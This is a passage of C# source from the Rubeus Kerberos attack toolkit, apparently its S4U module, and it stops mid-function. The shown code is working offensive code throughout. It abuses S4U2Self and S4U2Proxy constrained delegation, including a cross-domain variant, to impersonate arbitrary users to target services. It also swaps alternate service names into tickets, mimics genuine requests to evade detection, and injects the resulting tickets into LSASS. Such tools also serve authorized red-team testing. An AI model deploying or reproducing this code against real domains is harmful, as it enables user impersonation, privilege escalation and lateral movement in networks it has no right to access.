using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Collections.Generic;
using Asn1;
using Rubeus.lib.Interop;


namespace Rubeus
{
    public class S4U
    {
        public static void Execute(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null, string targetDomainController = "", string targetDomain = "", bool self = false, bool opsec = false)
        {
            // first retrieve a TGT for the user
            byte[] kirbiBytes = Ask.TGT(userName, domain, keyString, etype, null, false, domainController, new LUID(), false, opsec);

            if (kirbiBytes == null)
            {
                Console.WriteLine("[X] Error retrieving a TGT with the supplied parameters");
                return;
            }
            else
            {
                Console.WriteLine("\r\n");
            }

            // transform the TGT bytes into a .kirbi file
            KRB_CRED kirbi = new KRB_CRED(kirbiBytes);

            // execute the s4u process
            Execute(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, tgs, targetDomainController, targetDomain, self, opsec);
        }
        public static void Execute(KRB_CRED kirbi, string targetUser, string targetSPN = "", string outfile = "", bool ptt = false, string domainController = "", string altService = "", KRB_CRED tgs = null, string targetDomainController = "", string targetDomain = "", bool s = false, bool opsec = false, string requestDomain = "", string impersonateDomain = "")
        {
            Console.WriteLine("[*] Action: S4U\r\n");

            if (!String.IsNullOrEmpty(targetDomain) && !String.IsNullOrEmpty(targetDomainController))
            {
                // do cross domain S4U
                // no support for supplying a TGS due to requiring more than a single ticket
                Console.WriteLine("[*] Performing cross domain constrained delegation");
                CrossDomainS4U(kirbi, targetUser, targetSPN, ptt, domainController, altService, targetDomainController, targetDomain);
            }
            else
            {
                if (tgs != null && String.IsNullOrEmpty(targetSPN) == false)
                {
                    Console.WriteLine("[*] Loaded a TGS for {0}\\{1}", tgs.enc_part.ticket_info[0].prealm, tgs.enc_part.ticket_info[0].pname.name_string[0]);
                    S4U2Proxy(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, tgs, opsec);
                }
                else
                {
                    KRB_CRED self = null;
                    if (!String.IsNullOrEmpty(targetDomain))
                    {
                        // Get relevent information from provided referral ticket
                        string userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];
                        string domain = targetDomain;
                        targetDomain = kirbi.enc_part.ticket_info[0].prealm;
                        Ticket ticket = kirbi.tickets[0];
                        byte[] clientKey = kirbi.enc_part.ticket_info[0].key.keyvalue;
                        Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype;

                        // If these domains are empty, use the domain from the referral ticket
                        if (String.IsNullOrEmpty(impersonateDomain))
                            impersonateDomain = targetDomain;

                        if (String.IsNullOrEmpty(requestDomain))
                            requestDomain = targetDomain;


                        KRB_CRED localSelf = CrossDomainS4U2Self(string.Format("{0}@{1}", userName, domain), string.Format("{0}@{1}", targetUser, impersonateDomain), domainController, ticket, clientKey, etype, Interop.KERB_ETYPE.subkey_keymaterial, false, altService, s, requestDomain, ptt);
                    }
                    else
                    {
                        self = S4U2Self(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, s, opsec);
                    }
                    if (String.IsNullOrEmpty(targetSPN) == false)
                    {
                        S4U2Proxy(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altService, self, opsec);
                    }
                }
            }
        }
        private static void S4U2Proxy(KRB_CRED kirbi, string targetUser, string targetSPN, string outfile, bool ptt, string domainController = "", string altService = "", KRB_CRED tgs = null, bool opsec = false)
        {
            Console.WriteLine("[*] Impersonating user '{0}' to target SPN '{1}'", targetUser, targetSPN);
            if (!String.IsNullOrEmpty(altService))
            {
                string[] altSnames = altService.Split(',');
                if (altSnames.Length == 1)
                {
                    Console.WriteLine("[*]   Final ticket will be for the alternate service '{0}'", altService);
                }
                else
                {
                    Console.WriteLine("[*]   Final tickets will be for the alternate services '{0}'", altService);
                }
            }

            // extract out the info needed for the TGS-REQ/S4U2Proxy execution
            string userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];
            string domain = kirbi.enc_part.ticket_info[0].prealm;
            Ticket ticket = kirbi.tickets[0];
            byte[] clientKey = kirbi.enc_part.ticket_info[0].key.keyvalue;
            Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype;

            string dcIP = Networking.GetDCIP(domainController);
            if (String.IsNullOrEmpty(dcIP)) { return; }
            Console.WriteLine("[*] Building S4U2proxy request for service: '{0}'", targetSPN);
            TGS_REQ s4u2proxyReq = new TGS_REQ(!opsec);

            s4u2proxyReq.req_body.kdcOptions = s4u2proxyReq.req_body.kdcOptions | Interop.KdcOptions.CONSTRAINED_DELEGATION;

            s4u2proxyReq.req_body.realm = domain;

            string[] parts = targetSPN.Split('/');
            string serverName = parts[parts.Length-1];

            s4u2proxyReq.req_body.sname.name_type = Interop.PRINCIPAL_TYPE.NT_SRV_INST;
            foreach(string part in parts)
            {
                s4u2proxyReq.req_body.sname.name_string.Add(part);
            }

            // supported encryption types
            s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.aes128_cts_hmac_sha1);
            s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.aes256_cts_hmac_sha1);
            s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.rc4_hmac);

            // add in the ticket from the S4U2self response
            s4u2proxyReq.req_body.additional_tickets.Add(tgs.tickets[0]);

            // needed for authenticator checksum
            byte[] cksum_Bytes = null;

            // the rest of the opsec changes
            if (opsec)
            {
                // remove renewableok and add canonicalize
                s4u2proxyReq.req_body.kdcOptions = s4u2proxyReq.req_body.kdcOptions & ~Interop.KdcOptions.RENEWABLEOK;
                s4u2proxyReq.req_body.kdcOptions = s4u2proxyReq.req_body.kdcOptions | Interop.KdcOptions.CANONICALIZE;

                // 15 minutes in the future like genuine requests
                DateTime till = DateTime.Now;
                till = till.AddMinutes(15);
                s4u2proxyReq.req_body.till = till;

                // extra etypes
                s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.rc4_hmac_exp);
                s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.old_exp);

                // get hostname and hostname of SPN
                string hostName = Dns.GetHostName().ToUpper();
                string targetHostName;
                if (parts.Length > 1)
                {
                    targetHostName = parts[1].Substring(0, parts[1].IndexOf('.')).ToUpper();
                }
                else
                {
                    targetHostName = hostName;
                }

                // create enc-authorization-data if target host is not the local machine
                if (hostName != targetHostName)
                {
                    // authdata requires key and etype from tgs
                    byte[] tgsKey = tgs.enc_part.ticket_info[0].key.keyvalue;
                    Interop.KERB_ETYPE tgsEtype = (Interop.KERB_ETYPE)tgs.enc_part.ticket_info[0].key.keytype;

                    List<AuthorizationData> tmp = new List<AuthorizationData>();
                    AuthorizationData restrictions = new AuthorizationData(Interop.AuthorizationDataType.KERB_AUTH_DATA_TOKEN_RESTRICTIONS);
                    AuthorizationData kerbLocal = new AuthorizationData(Interop.AuthorizationDataType.KERB_LOCAL);
                    tmp.Add(restrictions);
                    tmp.Add(kerbLocal);
                    AuthorizationData authorizationData = new AuthorizationData(tmp);
                    byte[] authorizationDataBytes = authorizationData.Encode().Encode();
                    byte[] enc_authorization_data = Crypto.KerberosEncrypt(tgsEtype, Interop.KRB_KEY_USAGE_TGS_REQ_ENC_AUTHOIRZATION_DATA, tgsKey, authorizationDataBytes);
                    s4u2proxyReq.req_body.enc_authorization_data = new EncryptedData((Int32)tgsEtype, enc_authorization_data);
                }

                // encode req_body for authenticator cksum
                AsnElt req_Body_ASN = s4u2proxyReq.req_body.Encode();
                AsnElt req_Body_ASNSeq = AsnElt.Make(AsnElt.SEQUENCE, new[] { req_Body_ASN });
                req_Body_ASNSeq = AsnElt.MakeImplicit(AsnElt.CONTEXT, 4, req_Body_ASNSeq);
                byte[] req_Body_Bytes = req_Body_ASNSeq.CopyValue();
                cksum_Bytes = Crypto.KerberosChecksum(clientKey, req_Body_Bytes, Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_RSA_MD5);
            }

            // moved to end so we can have the checksum in the authenticator
            PA_DATA padata = new PA_DATA(domain, userName, ticket, clientKey, etype, opsec, cksum_Bytes);
            s4u2proxyReq.padata.Add(padata);
            PA_DATA pac_options = new PA_DATA(false, false, false, true);
            s4u2proxyReq.padata.Add(pac_options);

            byte[] s4ubytes = s4u2proxyReq.Encode().Encode();

            Console.WriteLine("[*] Sending S4U2proxy request");
            byte[] response2 = Networking.SendBytes(dcIP, 88, s4ubytes);
            if (response2 == null)
            {
                return;
            }

            // decode the supplied bytes to an AsnElt object
            //  false == ignore trailing garbage
            AsnElt responseAsn = AsnElt.Decode(response2, false);

            // check the response value
            int responseTag = responseAsn.TagValue;

            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.TGS_REP)
            {
                Console.WriteLine("[+] S4U2proxy success!");

                // parse the response to an TGS-REP
                TGS_REP rep2 = new TGS_REP(responseAsn);

                // https://github.com/gentilkiwi/kekeo/blob/master/modules/asn1/kull_m_kerberos_asn1.h#L62
                byte[] outBytes2 = Crypto.KerberosDecrypt(etype, 8, clientKey, rep2.enc_part.cipher);
                AsnElt ae2 = AsnElt.Decode(outBytes2, false);
                EncKDCRepPart encRepPart2 = new EncKDCRepPart(ae2.Sub[0]);

                if (!String.IsNullOrEmpty(altService))
                {
                    string[] altSnames = altService.Split(',');

                    foreach (string altSname in altSnames)
                    {
                        // now build the final KRB-CRED structure with one or more alternate snames
                        KRB_CRED cred = new KRB_CRED();

                        // since we want an alternate sname, first substitute it into the ticket structure
                        rep2.ticket.sname.name_string[0] = altSname;

                        // add the ticket
                        cred.tickets.Add(rep2.ticket);

                        // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart

                        KrbCredInfo info = new KrbCredInfo();

                        // [0] add in the session key
                        info.key.keytype = encRepPart2.key.keytype;
                        info.key.keyvalue = encRepPart2.key.keyvalue;

                        // [1] prealm (domain)
                        info.prealm = encRepPart2.realm;

                        // [2] pname (user)
                        info.pname.name_type = rep2.cname.name_type;
                        info.pname.name_string = rep2.cname.name_string;

                        // [3] flags
                        info.flags = encRepPart2.flags;

                        // [4] authtime (not required)

                        // [5] starttime
                        info.starttime = encRepPart2.starttime;

                        // [6] endtime
                        info.endtime = encRepPart2.endtime;

                        // [7] renew-till
                        info.renew_till = encRepPart2.renew_till;

                        // [8] srealm
                        info.srealm = encRepPart2.realm;

                        // [9] sname
                        info.sname.name_type = encRepPart2.sname.name_type;
                        info.sname.name_string = encRepPart2.sname.name_string;

                        // if we want an alternate sname, substitute it into the encrypted portion of the KRB_CRED
                        Console.WriteLine("[*] Substituting alternative service name '{0}'", altSname);
                        info.sname.name_string[0] = altSname;

                        // add the ticket_info into the cred object
                        cred.enc_part.ticket_info.Add(info);

                        byte[] kirbiBytes = cred.Encode().Encode();

                        string kirbiString = Convert.ToBase64String(kirbiBytes);

                        Console.WriteLine("[*] base64(ticket.kirbi) for SPN '{0}/{1}':\r\n", altSname, serverName);

                        if (Rubeus.Program.wrapTickets)
                        {
                            // display the .kirbi base64, columns of 80 chararacters
                            foreach (string line in Helpers.Split(kirbiString, 80))
                            {
                                Console.WriteLine("      {0}", line);
                            }
                        }
                        else
                        {
                            Console.WriteLine("      {0}", kirbiString);
                        }

                        if (!String.IsNullOrEmpty(outfile))
                        {
                            string filename = $"{Helpers.GetBaseFromFilename(outfile)}_{altSname}-{serverName}{Helpers.GetExtensionFromFilename(outfile)}";
                            filename = Helpers.MakeValidFileName(filename);
                            if (Helpers.WriteBytesToFile(filename, kirbiBytes))
                            {
                                Console.WriteLine("\r\n[*] Ticket written to {0}\r\n", filename);
                            }
                        }

                        if (ptt)
                        {
                            // pass-the-ticket -> import into LSASS
                            LSA.ImportTicket(kirbiBytes, new LUID());
                        }
                    }
                }
                else
                {
                    // now build the final KRB-CRED structure, no alternate snames
                    KRB_CRED cred = new KRB_CRED();

                    // if we want an alternate sname, first substitute it into the ticket structure
                    if (!String.IsNullOrEmpty(altService))
                    {
                        rep2.ticket.sname.name_string[0] = altService;
                    }

                    // add the ticket
                    cred.tickets.Add(rep2.ticket);

                    // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart

                    KrbCredInfo info = new KrbCredInfo();

                    // [0] add in the session key
                    info.key.keytype = encRepPart2.key.keytype;
                    info.key.keyvalue = encRepPart2.key.keyvalue;

                    // [1] prealm (domain)
                    info.prealm = encRepPart2.realm;

                    // [2] pname (user)
                    info.pname.name_type = rep2.cname.name_type;
                    info.pname.name_string = rep2.cname.name_string;

                    // [3] flags
                    info.flags = encRepPart2.flags;

                    // [4] authtime (not required)

                    // [5] starttime
                    info.starttime = encRepPart2.starttime;

                    // [6] endtime
                    info.endtime = encRepPart2.endtime;

                    // [7] renew-till
                    info.renew_till = encRepPart2.renew_till;

                    // [8] srealm
                    info.srealm = encRepPart2.realm;

                    // [9] sname
                    info.sname.name_type = encRepPart2.sname.name_type;
                    info.sname.name_string = encRepPart2.sname.name_string;

                    // add the ticket_info into the cred object
                    cred.enc_part.ticket_info.Add(info);

                    byte[] kirbiBytes = cred.Encode().Encode();

                    string kirbiString = Convert.ToBase64String(kirbiBytes);

                    Console.WriteLine("[*] base64(ticket.kirbi) for SPN '{0}':\r\n", targetSPN);

                    if (Rubeus.Program.wrapTickets)
                    {
                        // display the .kirbi base64, columns of 80 chararacters
                        foreach (string line in Helpers.Split(kirbiString, 80))
                        {
                            Console.WriteLine("      {0}", line);
                        }
                    }
                    else
                    {
                        Console.WriteLine("      {0}", kirbiString);
                    }

                    if (!String.IsNullOrEmpty(outfile))
                    {
                        string filename = $"{Helpers.GetBaseFromFilename(outfile)}_{targetSPN}{Helpers.GetExtensionFromFilename(outfile)}";
                        filename = Helpers.MakeValidFileName(filename);
                        if (Helpers.WriteBytesToFile(filename, kirbiBytes))
                        {
                            Console.WriteLine("\r\n[*] Ticket written to {0}\r\n", filename);
                        }
                    }

                    if (ptt)
                    {
                        // pass-the-ticket -> import into LSASS
                        LSA.ImportTicket(kirbiBytes, new LUID());
                    }
                }
            }
            else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
            {
                // parse the response to an KRB-ERROR
                KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
                Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
            }
            else
            {
                Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
            }
        }
        private static KRB_CRED S4U2Self(KRB_CRED kirbi, string targetUser, string targetSPN, string outfile, bool ptt, string domainController = "", string altService = "", bool self = false, bool opsec = false)
        {
            // extract out the info needed for the TGS-REQ/S4U2Self execution
            string userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];
            string domain = kirbi.enc_part.ticket_info[0].prealm;
            Ticket ticket = kirbi.tickets[0];
            byte[] clientKey = kirbi.enc_part.ticket_info[0].key.keyvalue;
            Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype;

            string dcIP = Networking.GetDCIP(domainController);
            if (String.IsNullOrEmpty(dcIP)) { return null; }

            Console.WriteLine("[*] Building S4U2self request for: '{0}@{1}'", userName, domain);

            byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, domain, userName, ticket, clientKey, etype, Interop.KERB_ETYPE.subkey_keymaterial, false, targetUser, false, false, opsec);

            Console.WriteLine("[*] Sending S4U2self request");
            byte[] response = Networking.SendBytes(dcIP, 88, tgsBytes);
            if (response == null)
            {
                return null;
            }

            // decode the supplied bytes to an AsnElt object
            //  false == ignore trailing garbage
            AsnElt responseAsn = AsnElt.Decode(response, false);

            // check the response value
            int responseTag = responseAsn.TagValue;

            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.TGS_REP)
            {
                Console.WriteLine("[+] S4U2self success!");

                // parse the response to an TGS-REP
                TGS_REP rep = new TGS_REP(responseAsn);
                // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8
                byte[] outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, clientKey, rep.enc_part.cipher);
                AsnElt ae = AsnElt.Decode(outBytes, false);
                EncKDCRepPart encRepPart = new EncKDCRepPart(ae.Sub[0]);

                // now build the final KRB-CRED structure
                KRB_CRED cred = new KRB_CRED();

                // if we want to use this s4u2self ticket for authentication, change the sname
                if (!String.IsNullOrEmpty(altService) && self)
                {
                    rep.ticket.sname.name_string[0] = altService.Split('/')[0];
                    rep.ticket.sname.name_string.Add(altService.Split('/')[1]);
                }

                // add the ticket
                cred.tickets.Add(rep.ticket);

                // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart

                KrbCredInfo info = new KrbCredInfo();

                // [0] add in the session key
                info.key.keytype = encRepPart.key.keytype;
                info.key.keyvalue = encRepPart.key.keyvalue;

                // [1] prealm (domain)
                info.prealm = encRepPart.realm;

                // [2] pname (user)
                info.pname.name_type = rep.cname.name_type;
                info.pname.name_string = rep.cname.name_string;

                // [3] flags
                info.flags = encRepPart.flags;

                // [4] authtime (not required)

                // [5] starttime
                info.starttime = encRepPart.starttime;

                // [6] endtime
                info.endtime = encRepPart.endtime;

                // [7] renew-till
                info.renew_till = encRepPart.renew_till;

                // [8] srealm
                info.srealm = encRepPart.realm;

                // [9] sname
                info.sname.name_type = encRepPart.sname.name_type;
                info.sname.name_string = encRepPart.sname.name_string;

                // if we want to use the s4u2self change the sname here too
                if (!String.IsNullOrEmpty(altService) && self)
                {
                    Console.WriteLine("[*] Substituting alternative service name '{0}'", altService);
                    info.sname.name_string[0] = altService.Split('/')[0];
                    info.sname.name_string.Add(altService.Split('/')[1]);
                }

                // add the ticket_info into the cred object
                cred.enc_part.ticket_info.Add(info);

                byte[] kirbiBytes = cred.Encode().Encode();

                string kirbiString = Convert.ToBase64String(kirbiBytes);

                Console.WriteLine("[*] Got a TGS for '{0}' to '{1}@{2}'", info.pname.name_string[0], info.sname.name_string[0], info.srealm);
                Console.WriteLine("[*] base64(ticket.kirbi):\r\n");

                if (Rubeus.Program.wrapTickets)
                {
                    // display the .kirbi base64, columns of 80 chararacters
                    foreach (string line in Helpers.Split(kirbiString, 80))
                    {
                        Console.WriteLine("      {0}", line);
                    }
                }
                else
                {
                    Console.WriteLine("      {0}", kirbiString);
                }

                Console.WriteLine("");

                if (!String.IsNullOrEmpty(outfile))
                {
                    string filename = $"{Helpers.GetBaseFromFilename(outfile)}_{info.pname.name_string[0]}_to_{info.sname.name_string[0]}@{info.srealm}{Helpers.GetExtensionFromFilename(outfile)}";
                    filename = Helpers.MakeValidFileName(filename);
                    if (Helpers.WriteBytesToFile(filename, kirbiBytes))
                    {
                        Console.WriteLine("\r\n[*] Ticket written to {0}\r\n", filename);
                    }
                }

                if (ptt && self)
                {
                    // pass-the-ticket -> import into LSASS
                    LSA.ImportTicket(kirbiBytes, new LUID());
                }

                return cred;
            }
            else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
            {
                // parse the response to an KRB-ERROR
                KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
                Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
            }
            else
            {
                Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
            }

            return null;
        }

        private static void CrossDomainS4U(KRB_CRED kirbi, string targetUser, string targetSPN, bool ptt, string domainController = "", string altService = "", string targetDomainController = "", string targetDomain = "")
        {
            // extract out the info needed for the TGS-REQ/S4U2Self execution
            string userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];
            string domain = kirbi.enc_part.ticket_info[0].prealm;
            Ticket ticket = kirbi.tickets[0];
            byte[] clientKey = kirbi.enc_part.ticket_info[0].key.keyvalue;
            Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype;

            // user variables
            string user = string.Format("{0}@{1}", userName, domain);
            string target = string.Format("{0}@{1}", targetUser, targetDomain);

            // First retrieve our service ticket for the target domains KRBTGT from our DC
            Console.WriteLine("[*] Retrieving referral TGT from {0} for foreign domain, {1}, KRBTGT service", domain, targetDomain);
            byte[] crossBytes = Ask.TGS(userName, domain, ticket, clientKey, etype, string.Format("krbtgt/{0}", targetDomain), Interop.KERB_ETYPE.subkey_keymaterial, "", false, domainController, true);
            KRB_CRED crossTGS = new KRB_CRED(crossBytes);
            Interop.KERB_ETYPE crossEtype = (Interop.KERB_ETYPE)crossTGS.enc_part.ticket_info[0].key.keytype;
            byte[] crossKey = crossTGS.enc_part.ticket_info[0].key.keyvalue;

            // Next retrieve an S4U2Self referral from the target domains DC
            // to be used when we ask for a S4U2Self from our DC
            // We need to use our referral TGT for the target domain for this
            Console.WriteLine("[*] Retrieving the S4U2Self referral from {0}", targetDomain);
            KRB_CRED foreignSelf = CrossDomainS4U2Self(user, target, targetDomainController, crossTGS.tickets[0], crossKey, crossEtype, Interop.KERB_ETYPE.subkey_keymaterial);
            crossEtype = (Interop.KERB_ETYPE)foreignSelf.enc_part.ticket_info[0].key.keytype;
            crossKey = foreignSelf.enc_part.ticket_info[0].key.keyvalue;

            // Now retrieve the S4U2Self ticket from our DC
            // We use the S4U2Self referral to ask for this
            Console.WriteLine("[*] Requesting the S4U2Self ticket from {0}", domain);
            KRB_CRED localSelf = CrossDomainS4U2Self(user, target, domainController, foreignSelf.tickets[0], crossKey, crossEtype, Interop.KERB_ETYPE.subkey_keymaterial, false);

            // Using our standard TGT and attaching our local S4U2Self
            // retrieve an S4U2Proxy from our DC
            // This will be needed for the last request
            KRB_CRED localS4U2Proxy = CrossDomainS4U2Proxy(user, target, targetSPN, domainController, ticket, clientKey, etype, Interop.KERB_ETYPE.subkey_keymaterial, localSelf.tickets[0], false);
            crossEtype = (Interop.KERB_ETYPE)crossTGS.enc_part.ticket_info[0].key.keytype;
            crossKey = crossTGS.enc_part.ticket_info[0].key.keyvalue;

            // Lastly retrieve the final S4U2Proxy from the foreign domains DC
            // This is the service ticket we need to access the target service
            KRB_CRED foreignS4U2Proxy = CrossDomainS4U2Proxy(user, target, targetSPN, targetDomainController, crossTGS.tickets[0], crossKey, crossEtype, Interop.KERB_ETYPE.subkey_keymaterial, localS4U2Proxy.tickets[0], true, ptt);
        }

        // to perform the 2 S4U2Self requests
        private static KRB_CRED CrossDomainS4U2Self(string userName, string targetUser, string targetDomainController, Ticket ticket, byte[] clientKey, Interop.KERB_ETYPE etype, Interop.KERB_ETYPE requestEType, bool cross = true, string altService = "", bool self = false, string requestDomain = "", bool ptt = false)
        {
            // die if can't get IP of DC
            string dcIP = Networking.GetDCIP(targetDomainController);
            if (String.IsNullOrEmpty(dcIP)) { return null; }

            Console.WriteLine("[*] Requesting the cross realm 'S4U2Self' for {0} from {1}", targetUser, targetDomainController);
            byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, targetUser, ticket, clientKey, etype, requestEType, cross, requestDomain);

            Console.WriteLine("[*] Sending cross realm S4U2Self request");
            byte[] response = Networking.SendBytes(dcIP, 88, tgsBytes);
            if (response == null)
            {
                return null;
            }

            // decode the supplied bytes to an AsnElt object
            //  false == ignore trailing garbage
            AsnElt responseAsn = AsnElt.Decode(response, false);

            // check the response value
            int responseTag = responseAsn.TagValue;

            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.TGS_REP)
            {
                Console.WriteLine("[+] cross realm S4U2Self success!");

                // parse the response to an TGS-REP
                TGS_REP rep = new TGS_REP(responseAsn);
                // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8
                byte[] outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, clientKey, rep.enc_part.cipher);
                AsnElt ae = AsnElt.Decode(outBytes, false);
                EncKDCRepPart encRepPart = new EncKDCRepPart(ae.Sub[0]);

                // now build the final KRB-CRED structure
                KRB_CRED cred = new KRB_CRED();

                // if we want to use this s4u2self ticket for authentication, change the sname
                if (!String.IsNullOrEmpty(altService) && self)
                {
                    rep.ticket.sname.name_type = Interop.PRINCIPAL_TYPE.NT_SRV_INST;
                    rep.ticket.sname.name_string[0] = altService.Split('/')[0];
                    rep.ticket.sname.name_string.Add(altService.Split('/')[1]);
                }

                // add the ticket
                cred.tickets.Add(rep.ticket);

                // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart

                KrbCredInfo info = new KrbCredInfo();

                // [0] add in the session key
                info.key.keytype = encRepPart.key.keytype;
                info.key.keyvalue = encRepPart.key.keyvalue;

                // [1] prealm (domain)
                info.prealm = encRepPart.realm;

                // [2] pname (user)
                info.pname.name_type = rep.cname.name_type;
                info.pname.name_string = rep.cname.name_string;

                // [3] flags
                info.flags = encRepPart.flags;

                // [4] authtime (not required)

                // [5] starttime
                info.starttime = encRepPart.starttime;

                // [6] endtime
                info.endtime = encRepPart.endtime;

                // [7] renew-till
                info.renew_till = encRepPart.renew_till;

                // [8] srealm
                info.srealm = encRepPart.realm;

                // [9] sname
                info.sname.name_type = encRepPart.sname.name_type;
                info.sname.name_string = encRepPart.sname.name_string;
                // if we're rewriting the S4U2Self sname, change it here too
                if (!String.IsNullOrEmpty(altService) && self)
                {
                    Console.WriteLine("[*] Substituting alternative service name '{0}'", altService);
                    info.sname.name_type = Interop.PRINCIPAL_TYPE.NT_SRV_INST;
                    info.sname.name_string[0] = altService.Split('/')[0];
                    info.sname.name_string.Add(altService.Split('/')[1]);
                }

                // add the ticket_info into the cred object
                cred.enc_part.ticket_info.Add(info);

                byte[] kirbiBytes = cred.Encode().Encode();

                PrintTicket(kirbiBytes, "base64(ticket.kirbi)");

                KRB_CRED kirbi = new KRB_CRED(kirbiBytes);

                if (ptt)
                {
                    // pass-the-ticket -> import into LSASS
                    LSA.ImportTicket(kirbiBytes, new LUID());
                }

                return kirbi;
            }
            else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
            {
                // parse the response to an KRB-ERROR
                KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
                Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
            }
            else
            {
                Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
            }
            return null;
        }

        // to perform the 2 S4U2Proxy requests
        private static KRB_CRED CrossDomainS4U2Proxy(string userName, string targetUser, string targetSPN, string targetDomainController, Ticket ticket, byte[] clientKey, Interop.KERB_ETYPE etype, Interop.KERB_ETYPE requestEType, Ticket tgs = null, bool cross = true, bool ptt = false)
        {
            string dcIP = Networking.GetDCIP(targetDomainController);
            if (String.IsNullOrEmpty(dcIP)) { return null; }

            string domain = userName.Split('@')[1];
            string targetDomain = targetUser.Split('@')[1];

            Console.WriteLine("[*] Building S4U2proxy request for service: '{0}' on {1}", targetSPN, targetDomainController);
            TGS_REQ s4u2proxyReq = new TGS_REQ(cname: false);
            PA_DATA padata = new PA_DATA(domain, userName.Split('@')[0], ticket, clientKey, etype);
            s4u2proxyReq.padata.Add(padata);
            PA_DATA pac_options = new PA_DATA(false, false, false, true);
            s4u2proxyReq.padata.Add(pac_options);

            s4u2proxyReq.req_body.kdcOptions = s4u2proxyReq.req_body.kdcOptions | Interop.KdcOptions.CONSTRAINED_DELEGATION;
            s4u2proxyReq.req_body.kdcOptions = s4u2proxyReq.req_body.kdcOptions | Interop.KdcOptions.CANONICALIZE;
            s4u2proxyReq.req_body.kdcOptions = s4u2proxyReq.req_body.kdcOptions & ~Interop.KdcOptions.RENEWABLEOK;

            if (cross)
            {
                s4u2proxyReq.req_body.realm = targetDomain;
            }
            else
            {
                s4u2proxyReq.req_body.realm = domain;
            }

            string[] parts = targetSPN.Split('/');
            string serverName = parts[parts.Length - 1];

            s4u2proxyReq.req_body.sname.name_type = Interop.PRINCIPAL_TYPE.NT_SRV_INST;
            foreach (string part in parts)
            {
                s4u2proxyReq.req_body.sname.name_string.Add(part);
            }

            // supported encryption types
            s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.aes128_cts_hmac_sha1);
            s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.aes256_cts_hmac_sha1);
            s4u2proxyReq.req_body.etypes.Add(Interop.KERB_ETYPE.rc4_hmac);

            // add in the ticket from the S4U2self response
            s4u2proxyReq.req_body.additional_tickets.Add(tgs);

            byte[] s4ubytes = s4u2proxyReq.Encode().Encode();

            Console.WriteLine("[*] Sending S4U2proxy request");
            byte[] response2 = Networking.SendBytes(dcIP, 88, s4ubytes);
            if (response2 == null)
            {
                return null;
            }

            // decode the supplied bytes to an AsnElt object
            //  false == ignore trailing garbage
            AsnElt responseAsn = AsnElt.Decode(response2, false);

            // check the response value
            int responseTag = responseAsn.TagValue;

            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.TGS_REP)
            {
                Console.WriteLine("[+] S4U2proxy success!");

                // parse the response to an TGS-REP
                TGS_REP rep2 = new TGS_REP(responseAsn);

                // https://github.com/gentilkiwi/kekeo/blob/master/modules/asn1/kull_m_kerberos_asn1.h#L62
                byte[] outBytes2 = Crypto.KerberosDecrypt(etype, 8, clientKey, rep2.enc_part.cipher);
                AsnElt ae2 = AsnElt.Decode(outBytes2, false);
                EncKDCRepPart encRepPart2 = new EncKDCRepPart(ae2.Sub[0]);

                // now build the final KRB-CRED structure, no alternate snames
                KRB_CRED cred = new KRB_CRED();

                // add the ticket
                cred.tickets.Add(rep2.ticket);

                // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart

                KrbCredInfo info = new KrbCredInfo();

                // [0] add in the session key
